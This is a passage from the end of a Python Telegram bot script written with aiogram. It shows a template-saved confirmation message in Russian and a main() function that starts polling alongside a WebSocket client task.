        await m.answer(f"✅ Шаблон «{name}» сохранён.\nОткрой «🧱 Билдер» чтобы посмотреть.", parse_mode="HTML")

# ---------- APP MAIN ----------
async def main():
    if not BOT_TOKEN:
        log.error("BOT_TOKEN пуст")
        return

    bot = Bot(BOT_TOKEN)
    await setup_bot_commands(bot)

    dp = Dispatcher()
    dp.include_router(router)

    ws = WSClient(bot)
    dp["ws"] = ws

    ws_task = asyncio.create_task(ws.run())
    try:
        await dp.start_polling(bot, ws=ws)
    finally:
        ws_task.cancel()
        with contextlib.suppress(Exception):
            await ws_task

if __name__ == "__main__":
    asyncio.run(main())
